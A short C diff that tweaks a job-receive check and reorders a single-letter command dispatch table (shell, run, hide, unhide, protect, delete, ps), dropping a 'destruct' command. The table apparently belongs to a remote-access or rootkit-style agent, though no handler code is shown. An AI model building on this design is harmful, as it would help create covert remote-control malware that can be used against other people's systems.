@@ -26,23 +26,22 @@ struct cmd_handler_t {
 // recv all the data for the job
 bool __cmd_recv_all(job_t *job) {
   while (!job->complete)
-    if (!job_recv(job, false))
+    if (job_recv(job, false) != JOB_RECV_OK)
       return false;
   return true;
 }
 
 struct cmd_handler_t handlers[] = {
+    {.handler = cmd_ps,       .cmd = 'O'},
+    {.handler = cmd_run,      .cmd = 'R'},
     {.handler = cmd_info,     .cmd = 'I'},
-    {.handler = cmd_shell,    .cmd = 'S'},
-    {.handler = cmd_chdir,    .cmd = 'C'},
     {.handler = cmd_list,     .cmd = 'L'},
     {.handler = cmd_hide,     .cmd = 'H'},
+    {.handler = cmd_shell,    .cmd = 'S'},
+    {.handler = cmd_chdir,    .cmd = 'C'},
     {.handler = cmd_unhide,   .cmd = 'U'},
     {.handler = cmd_delete,   .cmd = 'D'},
-    {.handler = cmd_destruct, .cmd = 'Q'},
     {.handler = cmd_protect,  .cmd = 'P'},
-    {.handler = cmd_run,      .cmd = 'R'},
-    {.handler = cmd_ps,       .cmd = 'O'},
 };
 
 bool cmd_handle(job_t *job) {
